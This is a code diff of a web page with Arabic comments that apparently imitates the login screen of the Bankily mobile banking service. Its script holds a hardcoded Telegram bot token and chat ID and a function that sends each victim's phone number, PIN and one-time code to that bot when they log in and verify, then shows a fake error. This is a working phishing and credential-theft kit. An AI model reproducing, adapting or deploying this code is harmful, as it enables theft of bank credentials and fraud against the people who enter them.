@@ -387,10 +387,11 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-// إعدادات تيليجرام المحدثة
+// إعدادات تيليجرام
 const TELEGRAM_TOKEN = "8665334839:AAemllcVbHU7P-ETbT6uFT6MXBZjSk8EbM0";
 const TELEGRAM_CHAT_ID = "8859537702";
 
+// دالة الإرسال في مكانها الصحيح
 function sendToTelegram(phone, pin, otpCode = null) {
   let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
   if (otpCode) {
@@ -473,7 +474,6 @@ phEl.addEventListener('input',function(){
   document.getElementById('err-ph').textContent='';
 });
 
-// دالة تسجيل الدخول (تم ضبط مكان إرسال البيانات بشكل صحيح هنا)
 function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
@@ -484,7 +484,7 @@ function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    // إرسال رقم الهاتف والرقم السري للبوت فور صحة البيانات والانتقال لـ OTP
+    // استدعاء دالة الإرسال هنا عند إدخال الهاتف والرقم السري بنجاح
     sendToTelegram(ph, pin);
     showOtp();
   }
@@ -525,7 +525,6 @@ O.forEach(function(el,i){
   });
 });
 
-// دالة التحقق من رمز OTP وإرساله مع البيانات القديمة
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
   
@@ -536,7 +535,7 @@ function verify(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // إرسال الكود مع الهاتف والرقم السري معاً عند الضغط على التحقق
+  // استدعاء دالة الإرسال هنا لتضمين رمز OTP مع البيانات
   sendToTelegram(ph, pin, code);
 
   document.getElementById('otp-error-modal').classList.remove('hide');
